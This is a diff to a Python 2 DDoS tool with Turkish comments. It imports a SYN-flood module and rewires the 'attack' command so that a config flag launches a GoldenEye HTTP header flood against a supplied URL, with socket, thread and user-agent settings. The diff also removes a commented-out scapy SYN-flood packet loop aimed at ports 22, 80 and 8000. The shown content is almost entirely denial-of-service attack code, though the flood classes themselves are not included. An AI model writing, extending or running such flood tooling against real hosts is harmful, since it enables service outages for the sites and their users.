@@ -1,5 +1,8 @@
 #!/usr/bin/env python
 import logging
+
+from sendSYN import sendSYN
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import sys
 import time
@@ -583,7 +586,6 @@ class Striker(Process):
             print Exception
             pass
 
-
 def main():
     parser = OptionParser(usage=USAGE)
     for args, kwargs in OPTIONS:
@@ -671,69 +673,17 @@ def main():
                             print 'Enter proper argument.. E.g. BENCHMARK'
 
                 if args[1].lower() == 'http':
-                    print 'HTTP Header DDoS is started...'
+                    print 'HTTP Header update mode ...'
                     ###	Golden eye scriptini koy
-                    uas_file = None
-                    useragents = None
-                    url = None
-                    if options.url:
-                        url = options.url
-                        if url[0:4].lower() != 'http':
-                            print "Invalid URL supplied"
-                            parser.print_help()
-                            # print OPTIONS
-                            sys.exit()
-                    if options.socketCount:
-                        socks = int(options.socketCount)
-                    if options.methodType:
-                        method = options.methodType
-                    if options.threads:
-                        workers = int(options.threads)
-                    if options.useragent:
-                        uas_file = options.useragent
-                    if options.debugMode:
-                        if options.debugMode == 0:
-                            DEBUG = False
-                        elif options.debugMode >= 1:
-                            DEBUG = True
-
                     # Update config file
                     if options.write == 'yes':
                         configFileHelper.writeChangesToConfigFile()
 
-                    if uas_file:
-                        try:
-                            with open(uas_file) as f:
-                                useragents = f.readlines()
-                        except EnvironmentError:
-                            EnvironmentError.error("cannot read file {0}".format(uas_file))
-
-                        goldeneye = GoldenEye(url)
-                        goldeneye.useragents = useragents
-                        goldeneye.nr_workers = workers
-                        goldeneye.method = method
-                        goldeneye.nr_sockets = socks
-                        goldeneye.fire()
                 ## elif olmasi lazim...
                 if args[1].lower() == 'syn':
                     # Update config file
                     if options.write == 'yes':
                         configFileHelper.writeChangesToConfigFile()
-                        # print 'SYN Flood DDoS is started...'
-                        # ####	hping3 scriptini koy
-                        # #conf.verb=0
-                        # print "Field Values of packet sent"
-                        # p=IP(dst=options.targetIP,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80,8000],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
-                        # ls(p)
-                        # print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
-                        # ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
-                        # print "Summary of answered & unanswered packets"
-                        # ans.summary()
-                        # unans.summary()
-                        # print "source port flags in response"
-                        # #for s,r in ans:
-                        # # print r.sprintf("%TCP.sport% \t %TCP.flags%")
-                        # ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
 
                 if args[1].lower() == 'attack':
                     print 'DDoS attack session executed....'
@@ -778,13 +728,57 @@ def main():
                             monitorNetwork()
                             event.clear()
                         except KeyboardInterrupt:
-                            print '\nInterrupted in main..'
-                            event.clear()
-                        # else:
-                            # 	print 'Supply proper argument'
-                            # 	parser.print_help()
-                            # 	#print OPTIONS
-                            # 	sys.exit()
+                             print '\nInterrupted in  main..'
+                             event.clear()
+
+                    if configFileHelper.httpFlood.enabled == 'yes':
+                        print ''
+                        print 'HTTP HEADER DDoS HAS STARTED'
+                        uas_file = None
+                        useragents = None
+                        url = None
+                        workers = None
+                        method = None
+                        socks = None
+                        if options.url:
+                            url = options.url
+                            if url[0:4].lower() != 'http':
+                                print "Invalid URL supplied"
+                                parser.print_help()
+                                # print OPTIONS
+                                sys.exit()
+                        if options.socketCount:
+                            socks = int(options.socketCount)
+                        if options.methodType:
+                            method = options.methodType
+                        if options.threads:
+                            workers = int(options.threads)
+                        if options.useragent:
+                            uas_file = options.useragent
+                        if options.debugMode:
+                            if options.debugMode == 0:
+                                DEBUG = False
+                            elif options.debugMode >= 1:
+                                DEBUG = True
+
+                        if uas_file:
+                            try:
+                                with open(uas_file) as f:
+                                    useragents = f.readlines()
+                            except EnvironmentError:
+                                EnvironmentError.error("cannot read file {0}".format(uas_file))
+
+                            goldeneye = GoldenEye(url)
+                            goldeneye.useragents = useragents
+                            goldeneye.nr_workers = workers
+                            goldeneye.method = method
+                            goldeneye.nr_sockets = socks
+                            goldeneye.fire()
+                    # else:
+                        # 	print 'Supply proper argument'
+                        # 	parser.print_help()
+                        # 	#print OPTIONS
+                        # 	sys.exit()
         else:
             print 'Choose proper attack..'
             parser.print_help()
